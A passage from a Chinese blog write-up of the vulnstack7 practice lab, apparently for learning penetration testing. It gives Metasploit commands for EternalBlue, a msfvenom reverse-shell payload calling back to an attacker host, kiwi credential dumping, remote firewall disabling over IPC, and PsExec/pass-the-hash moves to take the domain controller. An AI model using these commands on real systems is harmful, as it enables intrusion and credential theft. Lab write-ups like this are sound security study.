+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COOKIE:PHPSESSID=9ht1n00n0hudq29jsqfgtid435;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="5f667a00d7504e9496b8cfa2ce75cf9e.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>可以得到版本为<code>v11.3</code>，通过查询，该版本存在<strong>后台文件上传</strong>漏洞，可进行getshell；</p>
+<p>也就是说，通过任意用户登录漏洞结合后台文件上传漏洞，理论上可以获取 <a class="link"   target="_blank" rel="noopener" href="http://10.10.20.14:8080/" >http://10.10.20.14:8080/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 所对应的通达OA服务器的控制权限；</p>
+<h3 id="通达OA文件上传漏洞"><a href="#通达OA文件上传漏洞" class="headerlink" title="通达OA文件上传漏洞"></a>通达OA文件上传漏洞</h3><p>在GitHub上搜索到通达OA“任意用户登录漏洞+后台文件上传漏洞”的一键getshell利用脚本：<a class="link"   target="_blank" rel="noopener" href="https://github.com/z1un/TongdaOA-exp" >TongdaOA-exp：https://github.com/z1un/TongdaOA-exp<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- 网上WP：这里修改了它的 TongdaOA-exp 脚本。我发现他在发现 fake_user 漏洞的时候，不能正确获取 cookie。</span><br><span class="line">	- 把上述 Fake_user 脚本运行出来的 cookie 值替换到了 TongdaOA-exp 脚本中</span><br></pre></td></tr></table></figure></div>
+<p>结果如下：（如需修改后的脚本可评论区联系，不然会被审核和谐掉）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="d6c3bf9d5e054fe8955a74681873f44d.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>冰蝎也成功连接：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="be10a98b3c1d4d4a87f551c9bf934fd7.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="0261ad15215c4cc4aba78f6a59119c87.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>得到最高权限，<code>拿下第三台主机！</code></p>
+<p>执行命令查看IP地址，之前我们的猜测：“上述两个Web服务访问界面完全一致，可以猜测10.10.10.30和10.10.20.14也同属一台服务器；” 也是<strong>正确的</strong>；</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="5f746f5d947b41c9b4d6f0ce05018e67.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="利用MS17-010测试域控DC445端口的SMB服务-失败"><a href="#利用MS17-010测试域控DC445端口的SMB服务-失败" class="headerlink" title="利用MS17-010测试域控DC445端口的SMB服务(失败)"></a>利用MS17-010测试域控DC445端口的SMB服务(失败)</h3><blockquote>
+<p>现在我们就剩下一台域控DC以及一台Windows7没有控制了；</p>
+</blockquote>
+<p>在之前二层内网信息收集中，我们还发现了另外一台Windows主机：<strong>10.10.20.16:445</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="55513665a5774172bf88e44b74a63b82.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>它开放了135、445、3389端口，可能存在永恒之蓝漏洞；所以我们可以针对其进行尝试：（MSF模块用了很多次，这里就不赘述了）</p>
+<blockquote>
+<p> 具体可以看：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73812072/article/details/158038108" >VulnStack-4靶场内网横向解析(Struts2，Tomcat，phpmyadmin漏洞利用，Dockers容器逃逸，Socks代理内网，PTH横向)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <strong>内网横向PC</strong>主机部分：<br> <img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="64dcf8e33d514268a6e668a24c8be331.png"
+                      alt="在这里插入图片描述"
+                ></p>
+</blockquote>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 10.10.20.16</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+<p>结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="ff5b339fb726421a820a671e1e6ed59e.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>很可惜，并没有成功；</p>
+<h3 id="mimikatz获取密码横向域控DC"><a href="#mimikatz获取密码横向域控DC" class="headerlink" title="mimikatz获取密码横向域控DC"></a>mimikatz获取密码横向域控DC</h3><p>这里我们换种方式，加载msf集成的<code>mimikatz</code>模快：</p>
+<ul>
+<li>前提将通达OA的主机也上线到MSF中</li>
+<li>因为mimikatz需要在<strong>Windows主机</strong>中才能执行；</li>
+<li>我们的shell是Ubuntu1的主机；</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.20.17 LPORT=6666 -f exe &gt; MSF.exe</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 10.10.20.17</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+<p>结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="cbfce31fa73d4fe49669f9142fc93ae6.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>进入Windows会话，提权到SYSTEM后，再执行下面命令：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入会话</span></span><br><span class="line">load kiwi</span><br><span class="line">getsystem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取凭证</span></span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure></div>
+<p>过程：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="8175d7f6f2b84ad5a37cce2ab1e3d865.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="5048e8272937451e8f2cedc7df8e3475.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>再往下看，获取了相应的<code>明文密码</code>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="9362a64313be496f8714b4338f923dc3.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="使用Psexec-PTH横向域控"><a href="#使用Psexec-PTH横向域控" class="headerlink" title="使用Psexec &#x2F;PTH横向域控"></a>使用Psexec &#x2F;PTH横向域控</h3><p>尝试用administrator横向移动：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass Whoami2021</span><br><span class="line"><span class="built_in">set</span> rhost 10.10.20.16</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果失败了，很有可能是防火墙的问题，我们用IPC通道关闭防火</span></span><br><span class="line">net use \\10.10.20.16\ipc$ <span class="string">&quot;Whoami2021&quot;</span> /user:<span class="string">&quot;Administrator&quot;</span></span><br><span class="line">sc \\10.10.20.15 create unablefirewall binpath= <span class="string">&quot;netsh advfirewall set allprofiles state off&quot;</span></span><br><span class="line">sc \\10.10.20.16 start unablefirewall</span><br></pre></td></tr></table></figure></div>
+
+<p>关闭防火墙，再执行PTH横向：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="de4edd2249054a249693ee9e3d7b01c1.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>拿下域控：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="48014d1a261b4fea8f7cd2ed34b12aa8.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="c3f039ee99a84279934842ce5ad24d43.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p><code>至此，我们拿下了所有的主机；</code></p>
+<h2 id="额外知识补充：PTH与Psexec横向的区别"><a href="#额外知识补充：PTH与Psexec横向的区别" class="headerlink" title="额外知识补充：PTH与Psexec横向的区别"></a>额外知识补充：PTH与Psexec横向的区别</h2><p>我会用通俗易懂的方式为你解释这些命令和相关概念，特别适合新手理解渗透测试中的这些核心工具和方法。</p>
+<h4 id="1-什么是-Psexec？"><a href="#1-什么是-Psexec？" class="headerlink" title="1. 什么是 Psexec？"></a>1. 什么是 Psexec？</h4><p>Psexec 是微软 Sysinternals 套件中的一款官方工具，本意是<strong>允许管理员在远程Windows主机上执行命令&#x2F;程序</strong>（无需手动安装客户端）。<br>在渗透测试中，攻击者会滥用这个工具的原理：通过 SMB 协议（Windows 文件共享协议）连接目标主机，上传并执行一个小型可执行文件，从而获取远程命令执行权限。</p>
+<h4 id="2-什么是-PTH（Pass-the-Hash）横向？"><a href="#2-什么是-PTH（Pass-the-Hash）横向？" class="headerlink" title="2. 什么是 PTH（Pass-the-Hash）横向？"></a>2. 什么是 PTH（Pass-the-Hash）横向？</h4><ul>
+<li><strong>PTH（哈希传递）</strong>：一种绕过明文密码验证的攻击方式。Windows 系统会存储用户密码的 NTLM 哈希值，PTH 攻击直接使用这个哈希值代替明文密码进行身份验证，无需破解密码。</li>
+<li><strong>横向移动</strong>：拿下内网一台机器后，利用这台机器作为跳板，攻击同一内网中的其他机器。</li>
+<li><strong>你的命令不是 PTH</strong>：你提供的命令中使用了 <code>set smbpass Whoami2021</code>（明文密码），而非哈希值，因此这是<strong>普通的 Psexec 明文认证攻击</strong>，不是 PTH。<br>如果是 PTH，命令会是 <code>set smbpass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c</code>（NTLM 哈希格式）。</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 选择 Psexec 渗透模块（核心利用 SMB 协议的远程执行模块）</span></span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 设置攻击载荷：生成 64 位 Windows 系统的 Meterpreter 反向交互 shell（bind_tcp 表示让目标主动监听端口，攻击者连接）</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 设置目标主机的 SMB 用户名（Windows 管理员账户）</span></span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 设置目标主机的 SMB 密码（明文密码）</span></span><br><span class="line"><span class="built_in">set</span> smbpass Whoami2021</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 设置目标主机的 IP 地址</span></span><br><span class="line"><span class="built_in">set</span> rhost 10.10.20.16</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 执行攻击</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="3-如果要改成-PTH-攻击（补充）"><a href="#3-如果要改成-PTH-攻击（补充）" class="headerlink" title="3. 如果要改成 PTH 攻击（补充）"></a>3. 如果要改成 PTH 攻击（补充）</h4><p>如果你想实现 PTH 横向移动，只需修改密码为 NTLM 哈希即可，命令如下：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="comment"># 格式：LM哈希:NTLM哈希（LM哈希为空时用aad3b435b51404eeaad3b435b51404ee填充）</span></span><br><span class="line"><span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c</span><br><span class="line"><span class="built_in">set</span> rhost 10.10.20.16</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="一句话概括"><a href="#一句话概括" class="headerlink" title="一句话概括"></a>一句话概括</h3><ol>
+<li><strong>Psexec</strong>：原本是Windows远程管理工具，渗透中被用来通过SMB协议远程执行命令，获取目标权限；</li>
+<li><strong>你的命令本质</strong>：使用明文账号密码的Psexec攻击，不是PTH；</li>
+<li><strong>PTH（哈希传递）</strong>：核心是用NTLM哈希代替明文密码认证，无需破解密码即可横向移动，只需将<code>smbpass</code>改为哈希值即可实现。</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[🔴 Redis 未授权访问]</span><br><span class="line">          ↓</span><br><span class="line">[🔴 获得初始 Web Shell]</span><br><span class="line">          ↓</span><br><span class="line">[🟠 Laravel CVE-2021-3129]</span><br><span class="line">          ↓</span><br><span class="line">[🟠 拿到 Docker www-data 权限]</span><br><span class="line">          ↓</span><br><span class="line">[🟠 环境变量劫持 → 容器 Root]</span><br><span class="line">          ↓</span><br><span class="line">[🟠 Docker 特权挂载物理机目录]</span><br><span class="line">          ↓</span><br><span class="line">[🟠 写入 SSH Key → Docker 宿主机 Root]</span><br><span class="line">          ↓</span><br><span class="line">[🟡 内网双网段扫描 → 发现通达OA]</span><br><span class="line">          ↓</span><br><span class="line">[🔵 通达OA Fake_user + 文件上传漏洞]</span><br><span class="line">          ↓</span><br><span class="line">[🔵 拿下 PC1 System 权限]</span><br><span class="line">          ↓</span><br><span class="line">[🔵 通过PC1上传MSF payload到PC2]</span><br><span class="line">          ↓          </span><br><span class="line">[🔵 MSF Kiwi 抓取明文密码]</span><br><span class="line">          ↓</span><br><span class="line">[🔵 关闭目标防火墙]</span><br><span class="line">          ↓</span><br><span class="line">[🟣 PsExec 横向移动 → 拿下域控]</span><br></pre></td></tr></table></figure></div>
+<p>本次 vulnstack7 靶场渗透测试，先通过 Laravel RCE 漏洞获取对应 Docker 容器普通权限，利用 Redis 未授权访问拿到 Ubuntu 服务器 root 权限；再经 SUID 提权与特权模式逃逸获取 Docker 宿主机控制权，搭建内网代理打通两个内网网段；随后发现域环境、通达 OA 与开放 445 端口的 Win7 主机，借助 OA 漏洞、MS17-010 及 PsExec 横向渗透，最终控制内网全部主机。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="3ade3601fc2d4db78697c431bd93c7d1.png"
+                      alt="在这里插入图片描述"
+                ><br>创作不易，感谢支持；</p>
+<blockquote>
+<p>期待下次再见；</p>
+</blockquote>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> Internal-network-6</li>
+        <li><strong>作者:</strong> W1nner丶</li>
+        <li><strong>创建于
+                :</strong> 2026-06-04 12:35:28</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2026-06-04 12:38:19
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://tamoon1.github.io/2026/06/04/Internal-network-6/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                [object Object]
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="../../../../tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%8F%90%E6%9D%83/">#内网横向提权</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="../../../../tags/Internal-network-penetration/">#Internal network penetration</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="../../../05/31/github-pages-hexo-guide/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">如何创建个人博客</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '../../../../js/libs/waline.js';
+
+      (function() {
+        const startPath = location.pathname;
+        const startTime = Date.now();
+        const retryDelay = 200;
+        const retryLimit = 5000;
+
+        const runWaline = () => {
+          if (location.pathname !== startPath) {
+            return;
+          }
+
+          const container = document.getElementById('waline');
+          if (!container) {
+            if (Date.now() - startTime < retryLimit) {
+              setTimeout(runWaline, retryDelay);
+            }
+            return;
+          }
+
+          if (window.redefineWalineInstance?.destroy) {
+            window.redefineWalineInstance.destroy();
+          }
+
+          container.innerHTML = '';
+          window.redefineWalineInstance = init({
+            el: '#waline',
+            serverURL: 'https://example.example.com',
+            path: location.pathname,
+            dark: 'body[class~="dark-mode"]',
+            reaction: false,
+            requiredMeta: ['nick', 'mail'],
+            emoji: [],
+                      lang: 'zh-CN',
+          });
+        };
+
+        runWaline();
+      })();
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">Internal-network-6</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E4%BB%8B%E7%BB%8D"><span class="nav-text">靶场介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84"><span class="nav-text">网络拓扑结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE"><span class="nav-text">服务配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-text">域用户信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E9%85%8D%E7%BD%AE"><span class="nav-text">靶机配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ubuntu1%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="nav-text">Ubuntu1网络配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ubuntu2%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="nav-text">Ubuntu2网络配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows7-%E5%9F%9F%E6%8E%A7DC%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="nav-text">Windows7 + 域控DC网络配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98%EF%BC%9A%E8%AE%BF%E9%97%AE%E8%BF%94%E5%9B%9E502-Bad-Gateway-%E8%80%97%E6%97%B640%E5%88%86%E9%92%9F"><span class="nav-text">解决问题：访问返回502 Bad Gateway(耗时40分钟)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="nav-text">Web服务提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web%E6%A1%86%E6%9E%B6%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">Web框架信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Laravel-RCE%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%9C%8D%E5%8A%A1%E5%99%A881%E7%AB%AF%E5%8F%A3-%E5%93%A5%E6%96%AF%E6%8B%89"><span class="nav-text">Laravel RCE漏洞测试服务器81端口(哥斯拉)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%A1%AE%E8%AE%A4%E6%98%AFdocker%E7%8E%AF%E5%A2%83"><span class="nav-text">如何确认是docker环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%956379%E7%AB%AF%E5%8F%A3%E4%B8%8Essh%E5%85%8D%E5%AF%86%E7%99%BB%E9%99%86"><span class="nav-text">Redis未授权访问漏洞测试6379端口与ssh免密登陆</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Laravel%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8F%90%E6%9D%83"><span class="nav-text">Laravel服务器提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Laravel%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">Laravel服务器权限提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%88%B0%E5%AE%BF%E4%B8%BB%E6%9C%BA"><span class="nav-text">docker容器逃逸到宿主机</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8MSF%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E8%B7%AF%E7%94%B1"><span class="nav-text">利用MSF搭建内网路由</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E5%B1%82%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">一层内网信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E5%B1%82%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">二层内网信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E9%98%B6%E6%AE%B5"><span class="nav-text">内网横向阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E8%8E%B7%E5%8F%96%E7%89%88%E6%9C%AC%E5%8F%B7"><span class="nav-text">通达OA漏洞利用(获取版本号)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BE%BEOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-text">通达OA文件上传漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8MS17-010%E6%B5%8B%E8%AF%95%E5%9F%9F%E6%8E%A7DC445%E7%AB%AF%E5%8F%A3%E7%9A%84SMB%E6%9C%8D%E5%8A%A1-%E5%A4%B1%E8%B4%A5"><span class="nav-text">利用MS17-010测试域控DC445端口的SMB服务(失败)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%E6%A8%AA%E5%90%91%E5%9F%9F%E6%8E%A7DC"><span class="nav-text">mimikatz获取密码横向域控DC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Psexec-PTH%E6%A8%AA%E5%90%91%E5%9F%9F%E6%8E%A7"><span class="nav-text">使用Psexec &#x2F;PTH横向域控</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%9D%E5%A4%96%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85%EF%BC%9APTH%E4%B8%8EPsexec%E6%A8%AA%E5%90%91%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">额外知识补充：PTH与Psexec横向的区别</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%A6%82%E6%8B%AC"><span class="nav-text">一句话概括</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">W1nner丶</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 8 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
